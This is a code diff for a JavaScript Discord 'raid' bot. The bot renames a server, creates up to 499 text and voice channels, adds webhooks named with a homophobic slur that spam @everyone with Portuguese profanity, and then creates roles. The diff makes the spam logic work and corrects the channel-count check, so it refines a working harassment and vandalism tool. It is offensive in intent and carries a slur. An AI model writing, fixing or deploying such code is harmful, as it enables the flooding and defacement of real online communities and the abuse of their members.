@@ -37,23 +37,13 @@ client.on("message", async (message) => {
                 message.guild.setName('haha admin go grr')
                 for(i = 0; i < 499; i++){
                     message.guild.createChannel(`haha admin go grr`, {type: `text`}).then(m =>{
-                        const mch1 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case1hook = new Discord.WebhookClient(w.id, w.token)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`) //loops didnt work i swaer
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
                     message.guild.createChannel(`haha admin go grr`, {type: `voice`})
-                    if(message.guild.channels > 499) break;
+                    if(message.guild.channels.length > 499) break;
                  }
             } else {
                 message.guild.setName(`${args.slice(0).join(' ')}`)
@@ -62,20 +52,11 @@ client.on("message", async (message) => {
                         const mch2 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case2hook = new Discord.WebhookClient(w.id, w.token)                        
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case2hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, {type: `voice`})
-                    if(message.guild.channels > 499) break;
+                    if(message.guild.channels.length > 499) break;
                 }
             }
             for(i = 0; i == 250; i++) message.guild.createRole({name: 'boiola'})
